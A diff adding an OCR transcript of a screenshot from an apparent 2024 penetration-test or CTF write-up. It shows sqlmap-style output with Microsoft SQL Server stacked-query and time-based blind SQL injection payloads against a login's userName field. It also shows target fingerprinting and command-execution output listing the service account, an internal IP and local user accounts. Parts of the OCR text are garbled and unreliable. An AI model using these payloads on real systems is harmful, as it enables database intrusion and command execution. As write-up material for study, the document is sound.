@@ -1,0 +1,25 @@
+# OCR: 43ab96b73870cfcd69cf79ba59c9ce58.jpg
+# 来源: .\02-WriteUp\2024\43ab96b73870cfcd69cf79ba59c9ce58.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:27
+
+Bites |
+37
+98 Type: stacked queries
+99 Title: Microsoft SQL Server/Sybase stacked queries (comment)
+100 Payload: userName=admin';WAITFOR DELAY '0:0:5'--spassword=admin
+101
+102 Type: time-based blind
+103 Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
+04 Payload: userName=admin' WAITFOR DELAY '0:0:5'--spassword=admin
+205 ---
+106 web server operating system: Windows 7 or 2008 R2
+107 web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2014
+command standard output: 'nt service\mssqlserver'
+command standard output: 'IPv4 撑 纳 . 2 2. 2 et 172.16.0.137"
+command standard output:
+\\ 的 用 户 帐 户
+admin1 administraotrl Administrator
+delete Guest
+HPS, PRE-TRSMAR.
